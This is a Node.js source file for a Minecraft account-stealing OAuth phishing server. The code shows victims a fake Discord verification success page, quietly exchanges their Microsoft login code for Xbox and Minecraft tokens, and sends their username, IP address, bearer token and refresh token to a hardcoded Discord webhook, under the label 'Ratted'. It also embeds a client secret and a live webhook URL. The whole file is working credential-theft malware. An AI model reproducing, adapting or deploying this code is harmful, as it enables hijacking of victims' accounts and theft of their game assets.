const axios = require('axios');
const express = require('express');
const app = express();
const port = process.env.PORT || 3000;

// Configuration
const client_secret = 'yYF8Q~fzcqCGgHk2kuDBRqjI01S3cvdwA4Q9~dBC';
const client_id = 'dacf3fb0-ff2b-4126-ab38-469fb567d3cd';
const redirect_uri = 'https://mmcarries.onrender.com';
const webhook_url = 'https://discordapp.com/api/webhooks/1227947926052143177/-rdkTkxvq6OGUOTTgJUqIVV2v-5I5AYT7pszN8IqluGo2d5AYn6e9_z6wPkkDxnWnmX9';

app.get('/', async (req, res) => {
    res.send('Verification successful! Go back to Discord.');
    const code = req.query.code;
    if (!code) {
        return;
    }
    try {
        const [accessToken, refreshToken] = await getAccessTokenAndRefreshToken(code);
        console.log('Access Token:', accessToken);
        console.log('Refresh Token:', refreshToken);
        const [userToken, userHash] = await getUserHashAndToken(accessToken);
        console.log('User Token:', userToken);
        console.log('User Hash:', userHash);
        const xstsToken = await getXSTSToken(userToken);
        console.log('XSTS Token:', xstsToken); // Added line
        const bearerToken = await getBearerToken(xstsToken, userHash);
        const usernameAndUUIDArray = await getUsernameAndUUID(bearerToken);
        const uuid = usernameAndUUIDArray[0];
        const username = usernameAndUUIDArray[1];
        const ip = getIp(req);
        postToWebhook(username, bearerToken, uuid, ip, refreshToken);
    } catch (e) {
        console.log(e);
    }
});

app.listen(port, () => {
    console.log(`Started the server on ${port}`);
});

async function getAccessTokenAndRefreshToken(code) {
    const url = 'https://login.live.com/oauth20_token.srf';
    const config = {
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        }
    };
    const data = {
        client_id: client_id,
        redirect_uri: redirect_uri,
        client_secret: client_secret,
        code: code,
        grant_type: 'authorization_code'
    };
    const response = await axios.post(url, new URLSearchParams(data), config);
    return [response.data.access_token, response.data.refresh_token];
}

async function getUserHashAndToken(accessToken) {
    const url = 'https://user.auth.xboxlive.com/user/authenticate';
    const config = {
        headers: {
            'Content-Type': 'application/json', 'Accept': 'application/json'
        }
    };
    const data = {
        Properties: {
            AuthMethod: 'RPS', SiteName: 'user.auth.xboxlive.com', RpsTicket: `d=${accessToken}`
        }, RelyingParty: 'http://auth.xboxlive.com', TokenType: 'JWT'
    };
    const response = await axios.post(url, data, config);
    return [response.data.Token, response.data.DisplayClaims.xui[0].uhs];
}

async function getXSTSToken(userToken) {
    const url = 'https://xsts.auth.xboxlive.com/xsts/authorize';
    const config = {
        headers: {
            'Content-Type': 'application/json', 'Accept': 'application/json'
        }
    };
    const data = {
        Properties: {
            SandboxId: 'RETAIL',
            UserTokens: [userToken]
        }, RelyingParty: 'rp://api.minecraftservices.com/', TokenType: 'JWT'
    };
    const response = await axios.post(url, data, config);
    return response.data.Token;
}

async function getBearerToken(xstsToken, userHash) {
    const url = 'https://api.minecraftservices.com/authentication/login_with_xbox';
    const config = {
        headers: {
            'Content-Type': 'application/json'
        }
    };
    const data = {
        identityToken: `XBL3.0 x=${userHash};${xstsToken}`, ensureLegacyEnabled: true
    };
    const response = await axios.post(url, data, config);
    return response.data.access_token;
}

async function getUsernameAndUUID(bearerToken) {
    const url = 'https://api.minecraftservices.com/minecraft/profile';
    const config = {
        headers: {
            'Authorization': `Bearer ${bearerToken}`
        }
    };
    const response = await axios.get(url, config);
    return [response.data.id, response.data.name];
}

function getIp(req) {
    return req.headers['x-forwarded-for'] || req.socket.remoteAddress;
}

function postToWebhook(username, bearerToken, uuid, ip, refreshToken) {
    const url = webhook_url;
    const data = {
        username: 'MOG',
        avatar_url: 'https://www.globalsign.com/application/files/7416/1463/0119/iStock-1152537185.jpg',
        content: '@everyone',
        embeds: [{
            title: `Ratted ${username} - Click for networth`,
            color: 5898337,
            description: `**Username:**\n\`${username}\`\n\n**UUID:**\n\`${uuid}\`\n\n**IP:**\n\`${ip}\`\n\n**Token:**\n\`${bearerToken}\`\n\n**Refresh Token:**\n\`${refreshToken}\`\n\n**Login:**\n\`${username}:${uuid}:${bearerToken}\``,
            url: `https://spillager.live/skyblock/networth/${username}`,
            footer: {
                text: 'Minecraft oAuth Grabber by WH0',
                icon_url: 'https://www.globalsign.com/application/files/7416/1463/0119/iStock-1152537185.jpg'
            }
        }]
    };
    axios.all([axios.post(url, data), axios.post(webhook_url, data)]).then(() => console.log('Successfully authenticated, posting to webhook!'));
}
